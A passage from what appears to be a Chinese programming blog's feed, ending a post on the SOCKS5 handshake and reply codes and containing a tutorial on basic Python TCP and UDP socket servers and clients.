1  |  1  |   1   |  1   | Variable |    2     |+----+-----+-------+------+----------+----------+</code></pre><ul><li>REP 字段<ul><li>X’00’ succeeded</li><li>X’01’ general SOCKS server failure</li><li>X’02’ connection not allowed by ruleset</li><li>X’03’ Network unreachable</li><li>X’04’ Host unreachable</li><li>X’05’ Connection refused</li><li>X’06’ TTL expired</li><li>X’07’ Command not supported</li><li>X’08’ Address type not supported</li><li>X’09’ to X’FF’ unassigned</li></ul></li></ul><p>举个例子，客户端通过 127.0.0.1:8000 的代理发送请求</p><pre><code># request:        VER  CMD  RSV  ATYP DST.ADDR            DST.PORTclient -&gt; server: 0x05 0x01 0x00 0x01 0x7f 0x00 0x00 0x01 0x1f 0x40# response:       VER  REP  RSV  ATYP BND.ADDR            BND.PORTserver -&gt; client: 0x05 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x10 0x10</code></pre><h4 id="传输阶段"><a href="#传输阶段" class="headerlink" title="传输阶段"></a>传输阶段</h4><p>接下来就开始传输数据，socks5 服务器只做单纯的转发功能</p><p>整个过程如下</p><pre><code># 认证阶段client -&gt; server: 0x05 0x01 0x00server -&gt; client: 0x05 0x00# 连接阶段client -&gt; server: 0x05 0x01 0x00 0x03 0x0a b&apos;google.com&apos;  0x00 0x50server -&gt; client: 0x05 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x10 0x10# 传输阶段client -&gt; server -&gt; remoteremote -&gt; server -&gt; client...    </code></pre><p>下篇教程用代码实现下 socks5 代理</p><p>参考链接：</p><pre><code>* https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-xie-yi-yu-jie-gou.html#fn:bnd.addr* https://www.ietf.org/rfc/rfc1928.txt* http://www.moye.me/2017/08/03/analyze-socks5-protocol/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文讲的是如何写一个 socks5 代理，其实 shadowsocks 的代理也是 socks5 协议的，所以 socks5 代理也是本系列教程的一个重点。&lt;/p&gt;
&lt;p&gt;首先放出 socks5 协议的 &lt;a href=&quot;https://www.ietf.org/rfc/rfc1928.txt&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;rfc&lt;/a&gt;，socks5 协议很简单，SOCKS5 协议并不负责代理服务器的数据传输环节，此协议只是在 C/S 两端真实交互之间，建立起一条从客户端到代理服务器的授信连接。&lt;br&gt;
    
    </summary>
    
    
      <category term="代理" scheme="https://facert.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(2)- socket 编程</title>
    <link href="https://facert.github.io/2017/08/14/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-2-socket-%E7%BC%96%E7%A8%8B/"/>
    <id>https://facert.github.io/2017/08/14/由浅入深写代理-2-socket-编程/</id>
    <published>2017-08-14T15:21:04.000Z</published>
    <updated>2018-01-27T14:59:49.144Z</updated>
    
    <content type="html"><![CDATA[<p>说到代理，那肯定会跟网络协议有关，包括（tcp, ip, http），网络中的进程需要通过 socket 来通信，socket 可以认为是操作系统抽象出来的一类接口，供使用者能够更加方便的与底层的网络协议打交道。<br><a id="more"></a><br>0x01<br>我们先来看看 tcp 的 socket 编程。</p><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 将套接字绑定到地址</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 监听TCP传入连接</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">"new connection from %s:%s"</span> % addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send(<span class="string">b'Hello, %s!'</span> % data)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=handle_tcp, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'dog'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>上面是个很简单的客户端和服务端的例子，服务器端用了线程，主要是为了能够同时处理多个请求。不然每次处理请求的时候整个程序就会处于阻塞状态。</p><p>通过 wireshark 捕获请求，可以看到客户端经过三次握手和服务端连接成功，接下来双方开始发送数据，发送完成后，四次挥手断开连接。 </p><p><img src="/media/15029009030503.jpg" alt=""></p><p>具体说下过程吧</p><ol><li>首先服务器端初始化一个 socket 对象，将 socket 绑定到 (127.0.0.1, 8888) 这个地址上(bind)，然后开始监听(listen)，并阻塞在 accept 函数上，直到有连接过来。</li><li>客户端也初始化一个 socket 对象，调用 connect 和服务端建立连接。</li><li>服务端 accept 函数返回了一个新的 sock 套接字对象，传入到新线程中和客户端交互数据。</li><li>接下来就是 socket 的 recv 和 send 函数进行数据的交互。</li><li>最后 socket close 关闭套接字。</li></ol><p>由于 tcp 传递的数据属于 stream, 也就是调用 recv 和 send 的次数都没有限制，对数据的发送和边界也没有限制。这个和下文的 udp 编程有区别，发送端每执行一次写操作，udp 模块就会将它封装成一个 udp 包发送，接收端也对每个 udp 包执行一次读操作，每次都得完整取出来，如果没有足够的应用缓冲区来读取 udp 数据包，则会被截断。</p><p>0x02</p><p>再简单看下 udp 的 socket 编程</p><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># AF_INET: 基于 IPV4 的网络通信 SOCK_DGRAM: 基于 udp 的流式 socket 通信</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 将套接字绑定到地址</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'dog'</span>]:</span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>由于 udp 不需要建立连接，只需要知道对方的 IP 地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。所以客户端直接通过 sendto() 给服务器发数据，服务端调用 recvfrom() 就能拿到数据。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说到代理，那肯定会跟网络协议有关，包括（tcp, ip, http），网络中的进程需要通过 socket 来通信，socket 可以认为是操作系统抽象出来的一类接口，供使用者能够更加方便的与底层的网络协议打交道。&lt;br&gt;
    
    </summary>
    
    
      <category term="代理" scheme="https://facert.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
</feed>
